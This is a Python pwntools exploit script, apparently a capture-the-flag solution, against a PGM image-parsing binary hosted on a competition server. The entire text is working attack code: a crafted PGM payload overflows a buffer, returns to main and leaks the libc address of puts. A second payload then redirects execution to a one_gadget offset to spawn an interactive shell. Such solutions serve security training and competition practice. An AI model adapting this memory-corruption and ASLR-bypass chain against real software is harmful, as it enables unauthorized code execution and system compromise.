from pwn import *

e = ELF("./pgm")
libc = ELF("./libc.so.6")

context.binary = e.path

is_remote = "--remote" in sys.argv
def debug():
  if not is_remote:
    gdb.attach(p)

if is_remote:
  p = remote("host1.metaproblems.com", 5350)
else:
  p = process(e.path)
  #, env={"LD_PRELOAD": libc.path})

def en(s):
  ret = ""
  for i in s:
    ret += str(ord(i)) + " "
  return ret

debug()
p.sendlineafter("PGM.", "P2\n200 1\n255\n" + "1 64 128 192 224 1 1 1 " + "51 " * 0x78 + "\xff" * 8 * 4 + en(p64(e.symbols["main"])) + "41 " * 0x10 + en(p64(e.got["puts"])) + "\xff" * 8)

p.recv(1)
leak = ""
for i in range(5):
  leak = p.recv(1) + leak
leak = "\xc0" + leak

leak = (u64((leak).ljust(8, "\x00"))) - libc.symbols["puts"]
print(hex(leak))

p.sendlineafter("PGM.", "P2\n200 1\n255\n" + "1 64 128 192 224 1 1 1 " + "51 " * 0x78 + "\xff" * 8 * 4 + en(p64(leak + 0x4f322)) + "41 " * 0x10 + en(p64(e.got["puts"])) + "\xff" * 8)


p.interactive()
